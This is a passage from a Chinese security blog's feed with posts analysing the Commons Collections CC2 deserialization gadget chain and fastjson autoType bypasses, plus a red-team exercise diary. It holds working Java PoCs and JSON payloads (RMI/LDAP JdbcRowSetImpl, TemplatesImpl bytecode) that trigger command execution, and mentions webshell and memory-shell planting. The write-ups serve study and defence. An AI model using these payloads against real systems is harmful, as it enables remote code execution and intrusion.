constructor = new CtConstructor(new CtClass[]&#123;&#125;, person);        person.addConstructor(constructor);        //创建有参构造        constructor = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;,person);        constructor.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);//$0 = this, $1$2$3····代表方法参数        person.addConstructor(constructor);        CtMethod printName = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, person);        printName.setModifiers(Modifier.PUBLIC);        printName.setBody(&quot;System.out.println(name);&quot;);        person.addMethod(printName);        person.writeFile(&quot;./Person&quot;);    &#125;&#125;</code></pre><p>其中这一行不可缺少，String的值必须初始化，否则值有参构造的时候会发生报错。</p><pre><code>person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));</code></pre><p>我在网上并没有搜索到原因，debug也没有跟到，我猜测应该是如果为初始化，name值不会被加载到栈中，$0.name无法搜索到。以上仅个人观点，有错见谅。上面的代码会创建一个class文件。</p><pre><code class="java">public class Person &#123;    private String name = &quot;xiaotan&quot;;    public String getName() &#123;        return this.name;    &#125;    public void setName(String var1) &#123;        this.name = var1;    &#125;    public Person() &#123;    &#125;    public Person(String var1) &#123;        this.name = var1;    &#125;    public void printName() &#123;        System.out.println(this.name);    &#125;&#125;</code></pre><p>既然已经生成了class文件，我们不可避免的会思考到，我们如何调用javassist动态创建到类呢。这里有三个方法：</p><ul><li>通过反射调用</li><li>通过class文件调用</li><li>通过接口调用</li></ul><h3 id="通过反射调用"><a href="#通过反射调用" class="headerlink" title="通过反射调用"></a>通过反射调用</h3><pre><code class="java">public class test2 &#123;    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;        ClassPool pool = ClassPool.getDefault(); // 返回默认类池（其实就是在默认的jvm类搜索路径中搜索）        CtClass person = pool.makeClass(&quot;Person&quot;); // 创建Person类        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, person);//private String name        name.setModifiers(Modifier.PRIVATE);        person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));        person.addMethod(CtNewMethod.getter(&quot;getName&quot;,name));        person.addMethod(CtNewMethod.setter(&quot;setName&quot;,name));        //创建无参构造        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, person);        constructor.setBody(&quot;&#123;name = \&quot;xiaotan\&quot;;&#125;&quot;);        person.addConstructor(constructor);        //创建有参构造        constructor = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;,person);        constructor.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);//$0 = this, $1$2$3····代表方法参数        person.addConstructor(constructor);        CtMethod printName = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, person);        printName.setModifiers(Modifier.PUBLIC);        printName.setBody(&quot;System.out.println(name);&quot;);        person.addMethod(printName);        //person.writeFile(&quot;./Person&quot;);        Object obj = person.toClass().newInstance();        Method setName = obj.getClass().getMethod(&quot;setName&quot;, String.class);        setName.invoke(obj,&quot;pyshare&quot;);        Method method = obj.getClass().getMethod(&quot;printName&quot;);        method.invoke(obj);    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp2yb5rm2ij312c08e752.jpg" alt=""></p><p>这里在无参构造的时候新加了一段代码，否则会报错。</p><h3 id="通过-class文件调用"><a href="#通过-class文件调用" class="headerlink" title="通过.class文件调用"></a>通过.class文件调用</h3><pre><code class="java">ClassPool pool = ClassPool.getDefault();// 设置类路径pool.appendClassPath(&quot;/Users/xiaotan/Public/javacode/cc4/src/test/java&quot;);CtClass ctClass = pool.get(&quot;Person&quot;);Object person = ctClass.toClass().newInstance();//  ...... 下面和通过反射的方式一样去使用</code></pre><h3 id="通过接口调用"><a href="#通过接口调用" class="headerlink" title="通过接口调用"></a>通过接口调用</h3><pre><code class="java">public interface PersonI &#123;    void setName(String name);    String getName();    void printName();&#125;</code></pre><pre><code class="java">ClassPool pool = ClassPool.getDefault();pool.appendClassPath(&quot;/Users/xiaotan/Public/javacode/cc4/src/test/java&quot;);// 获取接口CtClass codeClassI = pool.get(&quot;PersonI&quot;);CtClass ctClass = pool.get(&quot;Person&quot;);ctClass.setInterfaces(new CtClass[]&#123;codeClassI&#125;);PersonI person = (PersonI)ctClass.toClass().newInstance();System.out.println(person.getName());person.setName(&quot;xiao&quot;);person.printName();</code></pre><p>我们可以发现其实第一种和第二种方法最终都是通过反射的方法执行的。</p><p>同理我们可以构造代码进行命令执行<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp36stes0lj31i80u07sg.jpg" alt=""><br>如上是通过加载字节码的方式调用的，当然也可以通过反射的方式调用，因为我们将代码以及加载进入了static中，因此我们主要将类实例化我们就可以进行命令执行。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp36ye630lj31g60qsh84.jpg" alt=""></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在ysoserial的cc2中使用了javassist和Templateslmpl（在后面的我会给出利用链，我们会发现其实利用链原理和fastjson1.2.24中相同）。但是直接看ysoserial的利用链很难理解，我们先沿用cc1的利用链，来进行命令执行，来更好的理解cc2的利用链。</p><h3 id="简易版Poc1"><a href="#简易版Poc1" class="headerlink" title="简易版Poc1"></a>简易版Poc1</h3><pre><code class="java">public class Poc1 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open -a Calculator&quot;&#125;)&#125;);        TransformingComparator comparator = new TransformingComparator(chain);        PriorityQueue queue = new PriorityQueue(1);        queue.add(1);        queue.add(2);        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        field.setAccessible(true);        field.set(queue,comparator);        try &#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));            inputStream.readObject();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp44ce41rij31fl0u0kf8.jpg" alt=""></p><p>我们先来看一下Poc1的利用链：</p><pre><code>ObjectInputStream.readObject()    PriorityQueue.readObject()    PriorityQueue.heapify()        PriorityQueue.siftDown()            PriorityQueue.siftDownUsingComparator()                TransformingComparator.compare()                    InvokerTransformer.transform()                        Method.invoke()            ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()</code></pre><p>我们debug进行跟入：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp476tumvcj31y80u01kx.jpg" alt=""><br>具体的利用链这里就不过多分析了，主要讲讲利用链的主要思路。</p><h4 id="为什么要在queue中加入两个值？"><a href="#为什么要在queue中加入两个值？" class="headerlink" title="为什么要在queue中加入两个值？"></a>为什么要在queue中加入两个值？</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp47inzzt2j30pc07iju3.jpg" alt=""><br>和cc1相同的是，cc2也是通过触发transform来进行命令执行的。而在cc2中是通过触发TransormingComparator的compare来触发的。我们先去看看this.transformer是否可控。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp47olmzomj31eq05m75a.jpg" alt=""><br>很幸运在TransormingComparator的有参构造中，可以直接操控decorated，和transormer</p><p>我们可以看见上面的POC1中又个很奇怪的地方:queue.add(1),queue.add(2)。为什么要这样写呢？因为中PriorityQueue.heapify()中会判断queue的size是否大于1，如果不是的话不会触发siftDown。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp47vlrttvj30uy06y76e.jpg" alt=""></p><h4 id="为什么用的是collections4-0？"><a href="#为什么用的是collections4-0？" class="headerlink" title="为什么用的是collections4.0？"></a>为什么用的是collections4.0？</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp48d1ewtgj31e20g0wn2.jpg" alt=""></p><p>因为在CC4.0中TransformingComparator继承了Serializable，而CC3.1没有。</p><h3 id="Poc2"><a href="#Poc2" class="headerlink" title="Poc2"></a>Poc2</h3><p>现在我们来看看yos中利用到javassist和Templateslmpl的利用链</p><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>这里是Templateslmpl加载字节码的利用链：</p><pre><code>TemplatesImpl.getOutputProperties()  TemplatesImpl.newTransformer()    TemplatesImpl.getTransletInstance()        TemplatesImpl.defineTransletClasses()            TransletClassLoader.defineClass()</code></pre><p>在Poc2中我们设置了几个值，这是因为在TemplatesImpl会对_name和_class判断，那_bytecodes又是如何触发的呢？我们跟入defineTransletClasses中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k1g6u0jj30zy0syjw4.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4jh66xsaj30ro0cognf.jpg" alt=""></p><p>这里会判断_name是否为null，_class是否为null。我们再回过头看看在TemplatesImpl中还有一个地方，为什么要将字节码classBytes设置成byte[][]的类型？</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k2df9sij30zc08kjtg.jpg" alt=""><br>这是因为在TemplatesImpl中，_bytecodes是byte[][]类型的，所以需要进行转换。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k50qfggj30yc05qgmb.jpg" alt=""></p><p>还有最后一点这里会判断字节码的父类是不是AbstractTranslet.class。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4kjybmb7j30xi0g0ac3.jpg" alt=""></p><h4 id="为什么要设置size为2"><a href="#为什么要设置size为2" class="headerlink" title="为什么要设置size为2"></a>为什么要设置size为2</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4kracjexj30vk06odgi.jpg" alt=""><br>这里如果不设置，则无法进入siftDown。</p><h3 id="为什么要用反射修改size"><a href="#为什么要用反射修改size" class="headerlink" title="为什么要用反射修改size"></a>为什么要用反射修改size</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4liashr0j31fo08idh8.jpg" alt=""></p><p>我们在Poc1中是直接利用add的方法修改size但是这里我也试了一下，是无法触发的，因为如果使用add会将TemplatesImpl覆盖掉，所以需要利用反射。而为什么需要修改size上面也已经说过了，如果size不大于1是无法触发siftDown的。<br>下面是Poc2完整的代码</p><pre><code class="java">import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class Poc2 &#123;    public static void main(String[] args) throws Exception &#123;        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;)                .getDeclaredConstructor(String.class);        constructor.setAccessible(true);        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;evil&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        cc.makeClassInitializer().insertBefore(cmd);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        TransformingComparator comparator = new TransformingComparator(transformer);        PriorityQueue queue = new PriorityQueue(1);        Object[] queue_array = new Object[]&#123;templates,1&#125;;        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);        queue_field.setAccessible(true);        queue_field.set(queue,queue_array);        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(queue,2);//        queue.add(1);//        queue.add(2);        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,comparator);        try&#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));            inputStream.readObject();        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    &#125;    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;        Field field = null;        try &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        &#125;        catch (NoSuchFieldException ex) &#123;            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        return field;    &#125;&#125;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上面是我对CC2的分析，分析的不是很仔细，只对一些关键点进行了分析，因为我觉得如果跟着利用链一步步分析有点像流水账，不如写下一些关键点，多留出思考的空间。下面想学习一下内网，可是也想学代码审计，呜呜，心还是静不下来，要努力把心静下来，好好专研技术。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>HW总结</title>
    <link href="http://yoursite.com/2021/03/26/HW%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2021/03/26/HW%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-26T06:21:01.000Z</published>
    <updated>2021-03-26T06:23:25.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HW总结"><a href="#HW总结" class="headerlink" title="HW总结"></a>HW总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经两个星期没有发文章了，因为前个星期在HW，身为一个大二的在校生，当要去HW当红队的时候，心里还是蛮紧张的。在那里包吃包住，而且酒店也挺好的，蛮开心的。从中也学到了很多，不过HW还是蛮累的，结束的那天十点就睡着啦，结果回来又有通知要打HW，此时我的心里是裂开的，又要醉生梦死了QAQ。</p><h2 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h2><h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3><p>第一天主要是在信息搜集，打点。运气蛮好的，在对某个网站进行C段扫描，和端口扫描的时候，发现了一个薄弱点。这里就不得不吐槽一下，服务器是真的垃圾呀，在当天晚上直接崩了，我都啥都没干就下了个数据库备份文件。当场脑溢血，没办法，当时只能想着第二天再想想办法，看看管理员会不会重启一下服务器。</p><h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><p>因为第一天晚上好不容易找到的服务器崩了，本来好不容易找到了mysql数据库的root权限账号密码，而且机缘巧合的该网站存在phpMyAdmin，结果网站炸了。第二天一大早起来，去看了看结果也还是依旧无法打开。哎，还能怎么办呢，只能重新再找一下看看有没有别的地方可以，结果找了一天无果。只有一些不痛不痒的小洞，还好，网站管理员在下午的时候，把网站又打开了，果断的利用phpMyAdmin写了一个webshell进去，结果可能被管理员发现了，好家伙，直接把网站给我关了，当场我就裂开了。</p><h3 id="第三天-amp-第四天"><a href="#第三天-amp-第四天" class="headerlink" title="第三天 &amp; 第四天"></a>第三天 &amp; 第四天</h3><p>运气好我又找到了一个点，并且种了一个内存马进去，可是虽然是root权限，可是我不能执行所有交互式的命令，反弹shell也弹不出，webshell写进去可是无法访问，哎终究是太菜了，哭泣。只能苦逼的找一找内网有啥利用点，因为内网不是很熟悉，在最后两天被别的队吊打了，因为队员都不太懂这些，基本上一个人在奋斗，QAQ好想被大佬带飞。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>正式学安全一年了，我咋还是这么菜。不知道下辈子能不能达到大佬们的一半水平QAQ。这次hw发现了自己的很多不足，在开发和内网的知识还有很多欠缺，还要更加努力的学习呀。今天更朱爷请教了一下审计的学习，很感谢大佬的指点，这段时间跟着木爷一起学习感觉很充实，希望以后还能继续努力。</p>]]></content>
    
    <summary type="html">
    
      闲谈
    
    </summary>
    
    
      <category term="闲谈" scheme="http://yoursite.com/categories/%E9%97%B2%E8%B0%88/"/>
    
    
      <category term="闲谈" scheme="http://yoursite.com/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/"/>
    <id>http://yoursite.com/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/</id>
    <published>2021-03-11T11:49:20.854Z</published>
    <updated>2021-07-29T05:50:57.051Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: 再探fastjson<br>author: xiaotan<br>cover: <a href="https://tva1.sinaimg.cn/large/008eGmZEly1gog88bsf23j31hc0u0x6p.jpg">https://tva1.sinaimg.cn/large/008eGmZEly1gog88bsf23j31hc0u0x6p.jpg</a><br>authorLink: york145.github.io/<br>authorAbout: 一个好奇的人<br>authorDesc: 一个好奇的人<br>categories: Java<br>date: 2021-03-11 20:12:01<br>comments: true<br>tags: </p><ul><li>java</li><li>悦读<br>keywords: Java<br>description: Java<br>photos: <a href="https://tva1.sinaimg.cn/large/008eGmZEly1gog88bsf23j31hc0u0x6p.jpg">https://tva1.sinaimg.cn/large/008eGmZEly1gog88bsf23j31hc0u0x6p.jpg</a></li></ul><hr><h1 id="再探fastjson"><a href="#再探fastjson" class="headerlink" title="再探fastjson"></a>再探fastjson</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>java 8u112</li><li>IDEA2020.3</li><li>fastjson<h2 id="fastjson-1-2-25-1-4-41"><a href="#fastjson-1-2-25-1-4-41" class="headerlink" title="fastjson 1.2.25-1.4.41"></a>fastjson 1.2.25-1.4.41</h2></li></ul><pre><code class="java">import com.alibaba.fastjson.JSON;public class Main &#123;    public static void main(String[] args) &#123;        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;        JSON.parse(PoC);    &#125;&#125;</code></pre><p>我们按照1.2.24的POC试试看。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwcdl67lj30vt06u75s.jpg" alt=""><br>很显然失败了，并且返回了一个错误：autoType is not support。在Fastjson1.2.25中使用了checkAutoType来修复1.2.22-1.2.24中的漏洞，其中有个autoTypeSupport默认为False。那chekAutoType究竟做了什么呢？我们还是利用现在的POC进行Debug观察一下。</p><p>按照执行链我们可以很容易的就找到checkAutotype这个函数。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwfvg4wuj30pu03sq3m.jpg" alt="">它传入了ref和null这两个参数。其中的ref就是我们传入的@type的值：com.sun.rowset.JdbcRowSetImpl，这里我们跟入。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwj5il41j30wi0cldhx.jpg" alt=""><br>如上图所示，先通过对typeName的替换得到className，随后判断autoTypeSupport和expectClass这里的expectClass就是在checkAutoType传入的null值，这里的判断不成立向下执行。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofwynzr97j30mj037mxe.jpg" alt=""><br>随后对clazz进行了两次寻找，但是最后都返回为null，我们这里重点关注一下getClassFromMapping这个函数，我们先看一下下一段函数。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gofx155zuxj312d0gdjtn.jpg" alt=""><br>下面先对clazz进行判断，加入clazz不为null，遍可以绕过黑名单检查，也可以不坚持autoTypeSupport。回归正题，我们继续往下跟，这里会进入else的执行语句，进入后会判断autoTyperSupport是否为flase，这里判断成功进入后会先匹配是否在黑名单中，如果存在就抛出异常，如果不存在继续匹配白名单。</p><p>我们对两个对class读取对函数，进行观察发现在Typeutils这个函数里面有个很奇怪的函数，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog2ti1mauj30ng0fqtau.jpg" alt=""><br>typeutils.loadClass这个函数中会去匹配class是否以[L或者L开头，；结尾，并且将它们去掉。这个函数很奇怪，这是因为：<br>JNI字段描述符的存在，其中的’[‘用以表示数组的层数，而第二个字符则表示数组的类型，例如：</p><ul><li>double[][]对应的类对象为”[[D”。</li><li>int[]对应的类对象为“[i”.</li><li>com.sun.rowset.JdbcRowSetImpl[]对应的类对象名为“[Lcom.sun.rowset.JdbcRowSetImpl;”</li></ul><p>L；其中的表示该对象所属的类。称为类对象描述符。</p><p>但是我们通过阅读整段的checkAutotype代码：</p><pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;        if (typeName == null) &#123;            return null;        &#125; else &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            if (this.autoTypeSupport || expectClass != null) &#123;                int i;                String deny;                for(i = 0; i &lt; this.acceptList.length; ++i) &#123;                    deny = this.acceptList[i];                    if (className.startsWith(deny)) &#123;                        return TypeUtils.loadClass(typeName, this.defaultClassLoader);                    &#125;                &#125;                for(i = 0; i &lt; this.denyList.length; ++i) &#123;                    deny = this.denyList[i];                    if (className.startsWith(deny)) &#123;                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);                    &#125;                &#125;            &#125;            Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);            if (clazz == null) &#123;                clazz = this.deserializers.findClass(typeName);            &#125;            if (clazz != null) &#123;                if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                &#125; else &#123;                    return clazz;                &#125;            &#125; else &#123;                if (!this.autoTypeSupport) &#123;                    String accept;                    int i;                    for(i = 0; i &lt; this.denyList.length; ++i) &#123;                        accept = this.denyList[i];                        if (className.startsWith(accept)) &#123;                            throw new JSONException(&quot;autoType is not support. &quot; + typeName);                        &#125;                    &#125;                    for(i = 0; i &lt; this.acceptList.length; ++i) &#123;                        accept = this.acceptList[i];                        if (className.startsWith(accept)) &#123;                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);                            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;                                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                            &#125;                            return clazz;                        &#125;                    &#125;                &#125;                if (this.autoTypeSupport || expectClass != null) &#123;                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);                &#125;                if (clazz != null) &#123;                    if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);                    &#125;                    if (expectClass != null) &#123;                        if (expectClass.isAssignableFrom(clazz)) &#123;                            return clazz;                        &#125;                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                    &#125;                &#125;                if (!this.autoTypeSupport) &#123;                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125; else &#123;                    return clazz;                &#125;            &#125;        &#125;    &#125;</code></pre><p>我们可以发现只有当AutoType为true是才可以触发loadclass，或者和需要中map中读取到class才能触发。<br>我们先看AutoType为true的情况：</p><pre><code class="java">public class Main &#123;    public static void main(String[] args) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;        JSON.parse(PoC);    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog4xbu0hgj314p02waad.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog4y89ofvj313u0miwir.jpg" alt=""><br>可以看见上面成功的触发了。<br>但是如果为fasle时又该如何触发呢？<br>这里偷了别人的POC：</p><pre><code class="java">&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测</p><p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用<br>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用.</p><h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson 1.2.42"></a>fastjson 1.2.42</h2><p>POC多加一个L和；。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog6x64luhj315i050mxm.jpg" alt=""></p><p>这是因为这checkAytoType中多了一次对classname的提取<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog705m1xxj312906dwfn.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gog71894vsj30ay048mx4.jpg" alt=""></p><p>所以多添加一组进行绕过。</p><p>这里有一篇对<a href="https://xz.aliyun.com/t/8140">checkAutoType安全机制分析详细的文章</a><br>1.4.3的漏洞也很简单。就不过多分析了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;title: 再探fastjson&lt;br&gt;author: xiaotan&lt;br&gt;cover: &lt;a href=&quot;https://tva1.sinaimg.cn/large/008eGmZEly1gog88bsf23j31hc0u0x6p.jpg&quot;&gt;https://
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>fastjson 1.22-1.24 Templateslmpl漏洞复现与分析</title>
    <link href="http://yoursite.com/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-08T13:12:01.000Z</published>
    <updated>2021-07-29T05:50:47.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson-1-22-1-24-Templateslmpl漏洞复习与分析"><a href="#fastjson-1-22-1-24-Templateslmpl漏洞复习与分析" class="headerlink" title="fastjson 1.22-1.24 Templateslmpl漏洞复习与分析"></a>fastjson 1.22-1.24 Templateslmpl漏洞复习与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天复现了一下jdbcRowsetlmpl,天来分析一下Templatelmpl。个人觉得Templatelmpl链比jdbcRowsetlmpl的要简单一些。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class TEMPOC extends AbstractTranslet &#123;    public TEMPOC() throws IOException &#123;        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;    &#125;    @Override    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;    &#125;    public static void main(String[] args) throws Exception &#123;        TEMPOC t = new TEMPOC();    &#125;&#125;</code></pre><p>将这个编译成class文件，再利用python脚步读取class文件进行base64加密。</p><pre><code class="python">import base64fin = open(r&quot;TEMPOC.class&quot;,&quot;rb&quot;)byte = fin.read()fout = base64.b64encode(byte).decode(&quot;utf-8&quot;)poc = 